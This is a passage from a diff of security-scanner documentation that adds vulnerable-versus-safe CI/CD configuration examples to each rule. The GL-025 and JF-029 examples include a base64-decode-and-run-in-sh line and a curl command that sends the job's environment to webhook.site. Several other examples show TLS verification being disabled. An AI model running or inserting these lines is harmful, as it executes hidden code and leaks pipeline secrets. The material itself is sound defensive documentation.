+# Vulnerable: ``include:`` pulls a remote project without
+# a pinned ref. ``ref:`` defaults to ``HEAD`` of the
+# default branch; whoever can push to that branch on
+# the templates project ships pipeline code into every
+# consumer.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    # no ref: — resolves to HEAD
+
+# Safe: pin ``ref:`` to a tag (with tag-protect enforced
+# on the templates project) or a 40-char commit SHA.
+# Renovate's gitlabci-include ecosystem updater bumps
+# these in reviewable MRs.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    ref: 0123456789abcdef0123456789abcdef01234567   # v1.4.2
+```
 
 **Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -2621,6 +3899,26 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip uses a plaintext-HTTP index and
+# ``--trusted-host`` silences hash verification.
+install:
+  image: python@sha256:abc123...
+  script:
+    - pip install --index-url http://internal-pypi.example.com/simple
+        --trusted-host internal-pypi.example.com -r requirements.txt
+
+# Safe: HTTPS + ``--require-hashes``. Internal CA
+# installed into the image's trust store.
+install:
+  image: python@sha256:abc123...
+  script:
+    - pip install --index-url https://internal-pypi.example.com/simple
+        --require-hashes -r requirements.txt
+```
 
 **Source:** [`GL-018`](../providers/gitlab.md#gl-018) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -2672,6 +3970,30 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` (or
+# ``git config http.sslverify false`` /
+# ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables TLS for
+# the rest of the job. A MITM swaps the registry's
+# tarballs in flight.
+install:
+  image: node@sha256:abc123...
+  script:
+    - npm config set strict-ssl false
+    - npm install
+
+# Safe: install the missing CA into the image trust
+# store; keep strict-ssl on.
+install:
+  image: node@sha256:abc123...
+  script:
+    - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+    - update-ca-certificates
+    - npm install
+```
+
 **Source:** [`GL-023`](../providers/gitlab.md#gl-023) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-024 }
@@ -2697,6 +4019,25 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a job body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a known
+# miner binary. A malicious MR (or a compromised co-
+# maintainer) lands the payload in the CI file; every
+# subsequent run executes it.
+build:
+  script:
+    - echo Z2g6Li4uIA== | base64 -d | sh
+    - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# If a check fires here, treat as incident response.
+build:
+  script: [make build]
+```
+
 **Source:** [`GL-025`](../providers/gitlab.md#gl-025) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-027 }
@@ -2717,6 +4058,29 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 
 **Recommendation.** Pin every ``services:`` entry the same way ``image:`` is pinned, prefer ``@sha256:<digest>``, or at minimum a full immutable version tag (``postgres:16.2-alpine``). Avoid ``:latest`` and bare tags like ``:16``.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``services:`` references mutable image
+# tags. A publisher repoint (or namespace takeover) on
+# the services image swaps the code that runs alongside
+# every job using the service.
+integration:
+  image: app@sha256:abc123...
+  services:
+    - postgres:15
+    - redis:7
+  script: [pytest]
+
+# Safe: pin every services image to its digest.
+integration:
+  image: app@sha256:abc123...
+  services:
+    - postgres@sha256:def456...   # postgres:15.4
+    - redis@sha256:fed987...      # redis:7.2.4
+  script: [pytest]
+```
+
 **Source:** [`GL-028`](../providers/gitlab.md#gl-028) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-029`: Manual deploy job defaults to allow_failure: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-029 }
@@ -2736,6 +4100,32 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 **How this is detected.** GL-005 only audits top-level ``include:``. Parent-child and multi-project pipelines that load YAML via the job-level ``trigger: include:`` slot slip through. Branch refs (``main``/``master``/``develop``/``head``) count as unpinned.
 
 **Recommendation.** Pin ``trigger: include: project:`` entries with ``ref:`` set to a tag or commit SHA. Avoid ``trigger: include: remote:`` for untrusted URLs; mirror the content into a trusted project and pin it there.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``trigger:`` ``include:`` pulls a child
+# pipeline definition from a remote project without
+# pinning the ref. Whoever can push to that project's
+# default branch ships child-pipeline content into the
+# parent's run.
+deploy:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'ci/templates'
+        file: '/child-pipeline.yml'
+        # no ref:
+
+# Safe: pin ``ref:`` to a SHA or protected tag.
+deploy:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'ci/templates'
+        file: '/child-pipeline.yml'
+        ref: 0123456789abcdef0123456789abcdef01234567
+```
 
 **Source:** [`GL-030`](../providers/gitlab.md#gl-030) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -2817,6 +4207,42 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 - Charts with no dependencies (the ``dependencies:`` key is absent or empty) pass automatically. There is nothing to lock.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``Chart.yaml`` declares a redis dependency by
+# version range but ``Chart.lock`` is absent. ``helm
+# dependency build`` resolves the range against whatever the
+# chart repo serves at install time. A compromised repo (or
+# a malicious chart cache) substitutes a backdoored redis-
+# 17.x tarball; the consuming cluster runs it.
+# Chart.yaml
+apiVersion: v2
+name: my-app
+version: 1.0.0
+dependencies:
+  - name: redis
+    version: ^17.0.0
+    repository: https://charts.bitnami.com/bitnami
+# Chart.lock missing entirely — no integrity gate on
+# ``helm dependency build``
+
+# Safe: run ``helm dependency update`` and commit
+# ``Chart.lock``. ``digest:`` is the sha256 of the resolved
+# tarball; ``helm dependency build`` re-fetches and verifies
+# the digest before unpacking. A swapped tarball changes the
+# digest and the build fails loud instead of silently
+# installing the substitute.
+# Chart.lock
+dependencies:
+  - name: redis
+    repository: https://charts.bitnami.com/bitnami
+    version: 17.15.4
+    digest: sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abcd
+digest: sha256:9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba
+generated: "2026-01-15T10:30:00Z"
+```
+
 **Source:** [`HELM-002`](../providers/helm.md) in the [Helm provider](../providers/helm.md).
 
 ### `HELM-003`: Chart dependency declared on a non-HTTPS repository <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-003 }
@@ -2833,6 +4259,44 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **Recommendation.** Switch each ``dependencies[].repository`` value to an ``https://`` chart repo URL, an ``oci://`` registry reference, or a ``file://`` path for in-repo charts. Plaintext ``http://`` (and other non-TLS schemes like ``git://``) lets any on-path attacker substitute the dependency tarball during ``helm dependency build``; ``Chart.lock``'s digest check (HELM-002) only catches that on the *next* update, not the compromised pull itself.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``helm dependency build`` fetches the redis
+# tarball over plaintext HTTP. Any on-path attacker
+# (compromised proxy, malicious WiFi, BGP hijack on the
+# internal mirror) substitutes a backdoored tarball; the
+# consuming cluster unpacks it into the umbrella chart.
+# ``Chart.lock``'s digest check (HELM-002) only catches
+# this on the *next* update, not the compromised pull
+# itself.
+apiVersion: v2
+name: my-app
+version: 1.0.0
+dependencies:
+  - name: redis
+    version: 17.15.4
+    repository: http://internal-charts.example.com
+
+# Safe: HTTPS gives TLS for the fetch; an OCI registry
+# reference (``oci://``) goes through the registry's TLS
+# config; a ``file://`` reference reads from disk inside
+# the same repo, so there's no network surface at all.
+apiVersion: v2
+name: my-app
+version: 1.0.0
+dependencies:
+  - name: redis
+    version: 17.15.4
+    repository: https://charts.bitnami.com/bitnami
+  - name: postgres
+    version: 12.1.0
+    repository: oci://registry.example.com/charts
+  - name: my-sidecar
+    version: 0.1.0
+    repository: file://../sidecar
+```
 
 **Source:** [`HELM-003`](../providers/helm.md) in the [Helm provider](../providers/helm.md).
 
@@ -2912,6 +4376,47 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Recommendation.** Pin every `@Library('name@<ref>')` to a release tag (e.g. `@v1.4.2`) or a 40-char commit SHA. Configure the library in Jenkins with 'Allow default version to be overridden' disabled so a pipeline can't escape the pin.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: every build resolves @main against the
+// shared-library repo. A push to main (legitimate update
+// from a teammate, a credential leak, a compromised
+// maintainer account) is silently picked up on the next
+// pipeline run with the build's full credential set in
+// scope (CI_JOB_TOKEN-equivalent, Jenkins credentials,
+// agent secrets).
+@Library('build-utils@main') _
+
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        deployToProd()  // sourced from the shared library
+      }
+    }
+  }
+}
+
+// Safe: pin to a release tag (or 40-char commit SHA) and
+// disable 'Allow default version to be overridden' on the
+// library config in Jenkins so a pipeline can't escape
+// the pin by re-declaring the @Library line.
+@Library('build-utils@v1.4.2') _
+
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        deployToProd()
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-001`](../providers/jenkins.md#jf-001) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-005`: Deploy stage missing manual `input` approval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-005 }
@@ -2952,6 +4457,37 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``image 'maven:3.9'`` is a mutable tag.
+// Docker Hub's maven team rebuilds it on every Maven
+// point release; a publisher takeover ships code into
+// every Jenkins build using the tag.
+pipeline {
+  agent {
+    docker { image 'maven:3.9' }
+  }
+  stages {
+    stage('build') {
+      steps { sh 'mvn -B verify' }
+    }
+  }
+}
+
+// Safe: pin to the content-addressable digest.
+pipeline {
+  agent {
+    docker { image 'maven@sha256:abc123...' }  // maven:3.9.5-eclipse-temurin-21
+  }
+  stages {
+    stage('build') {
+      steps { sh 'mvn -B verify' }
+    }
+  }
+}
+```
+
 **Source:** [`JF-009`](../providers/jenkins.md#jf-009) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-018 }
@@ -2963,6 +4499,42 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: pip uses a plaintext-HTTP index and
+// ``--trusted-host`` silences hash verification.
+pipeline {
+  agent { docker { image 'python@sha256:abc123...' } }
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          pip install --index-url http://internal-pypi.example.com/simple \
+            --trusted-host internal-pypi.example.com -r requirements.txt
+        '''
+      }
+    }
+  }
+}
+
+// Safe: HTTPS + ``--require-hashes``. Internal CA
+// installed in the agent image's trust store.
+pipeline {
+  agent { docker { image 'python@sha256:abc123...' } }
+  stages {
+    stage('install') {
+      steps {
+        sh '''
+          pip install --index-url https://internal-pypi.example.com/simple \
+            --require-hashes -r requirements.txt
+        '''
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-018`](../providers/jenkins.md#jf-018) in the [Jenkins provider](../providers/jenkins.md).
 
@@ -3014,6 +4586,43 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``git -c http.sslverify=false clone``
+// (or ``npm config set strict-ssl false``,
+// ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables
+// certificate verification. Any network attacker MITMs
+// the registry / remote and ships substituted bytes.
+pipeline {
+  agent any
+  stages {
+    stage('clone') {
+      steps {
+        sh 'git -c http.sslverify=false clone https://internal/repo.git'
+      }
+    }
+  }
+}
+
+// Safe: install the missing CA into the agent's trust
+// store and keep verification on.
+pipeline {
+  agent any
+  stages {
+    stage('clone') {
+      steps {
+        sh '''
+          sudo cp /var/jenkins_home/ca/internal.crt /usr/local/share/ca-certificates/
+          sudo update-ca-certificates
+          git clone https://internal/repo.git
+        '''
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-023`](../providers/jenkins.md#jf-023) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-024`: `input` approval step missing submitter restriction <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-024 }
@@ -3049,6 +4658,39 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: a stage body executes a base64-decoded
+// payload, exfils to a third-party webhook, or runs a
+// known miner binary. A malicious PR (or a compromised
+// maintainer) lands the payload in the Jenkinsfile;
+// every subsequent build runs it.
+pipeline {
+  agent any
+  stages {
+    stage('build') {
+      steps {
+        sh '''
+          echo Z2g6Li4uIA== | base64 -d | sh
+          curl https://webhook.site/abc?env=$(env|base64)
+        '''
+      }
+    }
+  }
+}
+
+// Safe: the build does only what the build does. No
+// obfuscated execution, no exfil POSTs, no
+// base64 -d | sh pipelines.
+pipeline {
+  agent any
+  stages {
+    stage('build') { steps { sh 'make build' } }
+  }
+}
+```
+
 **Source:** [`JF-029`](../providers/jenkins.md#jf-029) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-031`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-031 }
@@ -3069,6 +4711,42 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Recommendation.** Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``httpRequest`` with
+// ``ignoreSslErrors: true`` disables certificate
+// verification on the request. A MITM proxy or DNS
+// hijack between Jenkins and the API endpoint
+// substitutes the response, and the build trusts
+// whatever bytes arrive.
+pipeline {
+  agent any
+  stages {
+    stage('fetch') {
+      steps {
+        httpRequest url: 'https://api.example.com/manifest.json',
+                    ignoreSslErrors: true
+      }
+    }
+  }
+}
+
+// Safe: keep TLS verification on. For internal APIs on
+// a private CA, install the CA into the Jenkins JVM
+// trust store via the Java keystore (cacerts).
+pipeline {
+  agent any
+  stages {
+    stage('fetch') {
+      steps {
+        httpRequest url: 'https://api.example.com/manifest.json'
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-035`](../providers/jenkins.md#jf-035) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `LMB-001`: Lambda function has no code-signing config <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-001 }
@@ -3078,6 +4756,39 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **How this is detected.** Lambda code-signing config + a Signer profile (SIGN-001) validates that an uploaded zip was signed by a known profile before it's allowed to run. Without one, anyone who reaches ``lambda:UpdateFunctionCode``, a CI/CD role compromise, a misattached IAM policy, can replace the function's code with no chain-of-custody check.
 
 **Recommendation.** Create an AWS Signer profile, reference it from an ``aws_lambda_code_signing_config`` with ``untrusted_artifact_on_deployment = Enforce`` and attach that config to the function. Without one, the Lambda runtime will execute any code that a principal with lambda:UpdateFunctionCode uploads.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a Lambda function with no CodeSigningConfig
+# attached. Anyone with ``lambda:UpdateFunctionCode`` can
+# push arbitrary code without signature verification; a
+# compromised deploy role ships malicious code into
+# production with no signing gate.
+import boto3
+lambdacli = boto3.client('lambda')
+lambdacli.get_function(FunctionName='process-payment')[
+    'Configuration'
+].get('CodeSigningConfigArn')  # -> None
+
+# Safe: create a Signing Profile + CodeSigningConfig
+# and attach it. Only signed code packages (signed via
+# AWS Signer) can be deployed; unsigned uploads are
+# rejected by Lambda.
+signer = boto3.client('signer')
+prof = signer.put_signing_profile(
+    profileName='prod-lambda-signer',
+    platformId='AWSLambda-SHA384-ECDSA',
+)
+csc = lambdacli.create_code_signing_config(
+    AllowedPublishers={'SigningProfileVersionArns': [prof['profileVersionArn']]},
+    CodeSigningPolicies={'UntrustedArtifactOnDeployment': 'Enforce'},
+)
+lambdacli.update_function_configuration(
+    FunctionName='process-payment',
+    CodeSigningConfigArn=csc['CodeSigningConfig']['CodeSigningConfigArn'],
+)
+```
 
 **Source:** [`LMB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -3154,6 +4865,40 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 **Seen in the wild.**
 
 - Maven Central enforced HTTPS-only for the central repository in January 2020; the legacy ``http://repo1.maven.org`` endpoint was retired specifically because of MITM-tampering attacks against downstream consumers. https://blog.sonatype.com/central-repository-moving-to-https
+
+**Proof of exploit.**
+
+```
+<!-- Vulnerable: Maven fetches every dependency tarball
+     and pom from this repository over plaintext HTTP. Any
+     on-path attacker (compromised proxy, malicious VPN
+     exit, internal mirror BGP hijack) substitutes a
+     backdoored jar in flight. Maven's checksum verification
+     only checks against checksums served by the SAME host,
+     so the attacker swaps both the artifact and the
+     adjacent .sha1 file. -->
+<project>
+  <repositories>
+    <repository>
+      <id>internal-mirror</id>
+      <url>http://nexus.internal.example.com/repository/maven-public/</url>
+    </repository>
+  </repositories>
+</project>
+
+<!-- Safe: HTTPS gives TLS for both jar and checksum fetch.
+     For internal Nexus / Artifactory hosts on a private CA,
+     install the CA in the build agent's truststore;
+     never fall back to plaintext HTTP. -->
+<project>
+  <repositories>
+    <repository>
+      <id>internal-mirror</id>
+      <url>https://nexus.internal.example.com/repository/maven-public/</url>
+    </repository>
+  </repositories>
+</project>
+```
 
 **Source:** [`MVN-003`](../providers/maven.md#mvn-003) in the [maven provider](../providers/maven.md).
 
@@ -3272,6 +5017,43 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 - Lockfiles produced by old npm versions (npm < 5) wrote ``sha1-...`` integrity strings that some downstream tools regenerate as missing. The fix is the same in both cases: regenerate with a current npm version against a hash-providing registry.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``resolved`` URL is present but ``integrity``
+// is missing. npm has nothing to compare against at install
+// time, so a registry that swaps the tarball mid-flight
+// (cache poisoning, MITM, malicious mirror, account
+// republish) ships arbitrary code without any signal.
+// package-lock.json
+{
+  "lockfileVersion": 3,
+  "packages": {
+    "node_modules/lodash": {
+      "version": "4.17.21",
+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
+      // no "integrity" field
+    }
+  }
+}
+
+// Safe: regenerate with ``npm install`` against the default
+// registry. Every fetched-tarball entry carries an SRI
+// ``integrity: sha512-...`` field. npm refuses installs
+// whose tarball bytes don't hash to that value.
+// package-lock.json
+{
+  "lockfileVersion": 3,
+  "packages": {
+    "node_modules/lodash": {
+      "version": "4.17.21",
+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
+      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry...AJv8XZ1tvj5FvSg=="
+    }
+  }
+}
+```
+
 **Source:** [`NPM-002`](../providers/npm.md) in the [npm provider](../providers/npm.md).
 
 ### `NPM-003`: package-lock.json entry resolves from a non-registry source <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-003 }
@@ -3287,6 +5069,40 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 Standard ``https://registry.npmjs.org`` and other registered registries (GitHub Packages, Verdaccio, internal proxies) pass. A ``git+https://`` URL with a 40-character SHA also passes — that's the documented escape hatch for forks not yet published to a registry. Complements NPM-002 (missing integrity hash); NPM-003 catches the *source* shape, NPM-002 catches the *verification* shape.
 
 **Recommendation.** Move the dependency to a hash-verifiable registry source. If you genuinely need a fork that's not on npm, pin it via ``git+https://host/owner/repo.git#<40-char-sha>`` (exact commit, not a branch or tag) and document the audit trail. ``git+ssh://`` URLs are unreviewable by anyone without access to the same private SSH endpoint; ``http://`` URLs are MITM-able; bare ``file:`` paths bind the build to a developer-machine layout. The default-safe shape is ``https://registry.npmjs.org/...`` with ``integrity: sha512-...``, anything else needs a one-line rationale.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``resolved`` URL is git+ssh — a fork pulled
+// from an upstream the team can't audit publicly. The
+// branch ``@main`` is mutable; whoever can push to the
+// upstream ships code into every consumer's build.
+// package-lock.json
+{
+  "packages": {
+    "node_modules/internal-fork": {
+      "version": "1.0.0",
+      "resolved": "git+ssh://git@github.com/myorg/upstream-fork.git#main"
+    }
+  }
+}
+
+// Safe: publish the fork to a registry you control (GitHub
+// Packages, Verdaccio, npm scoped package) and pin via
+// version + integrity. If the upstream truly can't move,
+// pin via ``git+https://...#<40-char-sha>`` so the git
+// object is immutable.
+// package-lock.json
+{
+  "packages": {
+    "node_modules/internal-fork": {
+      "version": "1.0.0",
+      "resolved": "https://npm.pkg.github.com/myorg/internal-fork/-/internal-fork-1.0.0.tgz",
+      "integrity": "sha512-abc123...=="
+    }
+  }
+}
+```
 
 **Source:** [`NPM-003`](../providers/npm.md) in the [npm provider](../providers/npm.md).
 
@@ -3313,6 +5129,41 @@ This rule guards the *package you're publishing*. To stop *consumed* dependencie
 
 - Shai-Hulud npm worm (2026): the postinstall in compromised packages scraped ``GH_TOKEN`` / ``NPM_TOKEN`` / AWS env, used the stolen tokens to publish more compromised packages and push malicious workflow files into victim repos. Removing the install-time script primitive on the *publisher* side is the structural fix.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: every consumer who runs ``npm install`` on
+// this package executes ``setup.js`` with THEIR
+// credentials (``GH_TOKEN``, ``NPM_TOKEN``, AWS env, SSH
+// keys) silently — they didn't opt into anything beyond
+// installing the dependency. This is the Shai-Hulud worm
+// propagation primitive.
+// package.json
+{
+  "name": "my-lib",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node setup.js"
+  }
+}
+
+// Safe: move the work into an explicit script and document
+// the opt-in in the README. Consumers who need it run
+// ``npm run build`` after the install; consumers who don't
+// pay no cost. If you genuinely need native-module
+// compilation, ``node-gyp`` triggers ``install`` from a
+// ``binding.gyp`` without a ``scripts`` entry, so the
+// scripts block can stay empty.
+// package.json
+{
+  "name": "my-lib",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "node setup.js"
+  }
+}
+```
+
 **Source:** [`NPM-004`](../providers/npm.md) in the [npm provider](../providers/npm.md).
 
 ### `NPM-005`: package.json git dependency uses a mutable ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-npm-005 }
@@ -3329,6 +5180,37 @@ This rule guards the *package you're publishing*. To stop *consumed* dependencie
 Skips entries already routed elsewhere: registry specs (NPM-001), ``file:`` / ``link:`` / ``workspace:`` (NPM-003).
 
 **Recommendation.** Pin the git dependency to a 40-character commit SHA: ``"foo": "git+https://github.com/owner/repo.git#<sha>"``. Branch refs (``#main``, ``#master``) and tag refs (``#v1.2.3``) are mutable, anyone with push access to the upstream repo can swap the contents of what your build pulls without changing the dependency string. A commit SHA is immutable; a tampered upstream cannot redirect ``#<sha>`` to different content. If the upstream isn't yours, vendor the fork into a registry you control (GitHub Packages, internal Verdaccio) and pin via registry version instead.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: every ``npm install`` re-resolves ``#main``
+// against the upstream repo's HEAD. A push to ``main``
+// (legitimate co-maintainer commit, leaked PAT, hijacked
+// upstream account) ships into your build silently on the
+// next install. ``github:`` shorthand without any ``#``
+// is the same — resolves to default-branch HEAD.
+// package.json
+{
+  "dependencies": {
+    "util-fork": "git+https://github.com/myorg/util-fork.git#main",
+    "tiny-lib": "github:other-org/tiny-lib"
+  }
+}
+
+// Safe: pin to a 40-character commit SHA. The git object
+// is immutable — a re-push at the upstream side cannot
+// retarget ``#<sha>`` to different content. Renovate /
+// Dependabot's npm-vcs ecosystem updaters bump these in
+// reviewable PRs.
+// package.json
+{
+  "dependencies": {
+    "util-fork": "git+https://github.com/myorg/util-fork.git#0123456789abcdef0123456789abcdef01234567",
+    "tiny-lib": "github:other-org/tiny-lib#fedcba9876543210fedcba9876543210fedcba98"
+  }
+}
+```
 
 **Source:** [`NPM-005`](../providers/npm.md) in the [npm provider](../providers/npm.md).
 
@@ -3458,6 +5340,51 @@ ignore-scripts=true
 - Intermediate / cache-only images pushed by CI for later-stage consumption may legitimately ship without attestations to keep build artifacts small. Suppress via ignore-file when this is the deliberate shape, the default expectation for any image that reaches a production registry is a full attestation set.
 - Some registries strip the attestation sub-manifests on pull (``docker pull`` of a single platform unwraps the index). If the JSON you're scanning came from ``docker manifest inspect`` rather than ``docker buildx imagetools inspect --raw``, attestations may be invisible even when present upstream.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the image index ships per-architecture
+# manifests but no ``attestation-manifest`` sibling. A
+# downstream verifier (cosign verify-attestation,
+# slsa-verifier, policy-controller) has nothing to check
+# against, so the deployment can't enforce "only run
+# images with a SLSA L3 build attestation".
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.index.v1+json",
+  "manifests": [
+    { "digest": "sha256:linux-amd64...",
+      "platform": {"architecture": "amd64", "os": "linux"} },
+    { "digest": "sha256:linux-arm64...",
+      "platform": {"architecture": "arm64", "os": "linux"} }
+  ]
+}
+
+# Safe: build with ``docker buildx build
+# --attest=type=provenance,mode=max --attest=type=sbom``
+# so the index carries attestation-manifest siblings
+# linking SLSA provenance + SBOM to each per-platform
+# manifest by digest.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.index.v1+json",
+  "manifests": [
+    { "digest": "sha256:linux-amd64...",
+      "platform": {"architecture": "amd64", "os": "linux"} },
+    { "digest": "sha256:linux-arm64...",
+      "platform": {"architecture": "arm64", "os": "linux"} },
+    {
+      "digest": "sha256:attest-amd64...",
+      "platform": {"architecture": "unknown", "os": "unknown"},
+      "annotations": {
+        "vnd.docker.reference.type": "attestation-manifest",
+        "vnd.docker.reference.digest": "sha256:linux-amd64..."
+      }
+    }
+  ]
+}
+```
+
 **Source:** [`OCI-002`](../providers/oci.md#oci-002) in the [OCI manifest provider](../providers/oci.md).
 
 ### `OCI-003`: Image manifest is missing the ``image.created`` annotation <span class="pg-sev pg-sev--low">LOW</span> { #detail-oci-003 }
@@ -3501,6 +5428,51 @@ ignore-scripts=true
 
 - Some internal Harbor / Nexus deployments still proxy legacy Docker images that haven't been rebuilt; a pull succeeds because the proxy upgrades the manifest at request time, but the on-disk JSON if you saved it with ``inspect --raw`` may still report the original schemaVersion. If your registry is doing this in-flight promotion you can suppress; otherwise re-run the build.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``schemaVersion: 1`` predates the digest-
+# pinned design. The client has no way to verify that the
+# pulled blobs match what the registry served; a swapped
+# blob is silently accepted. Modern registries refuse v1
+# pushes, but a pre-existing v1 image in a private
+# registry stays pullable and unverified.
+{
+  "schemaVersion": 1,
+  "name": "myorg/legacy-app",
+  "tag": "latest",
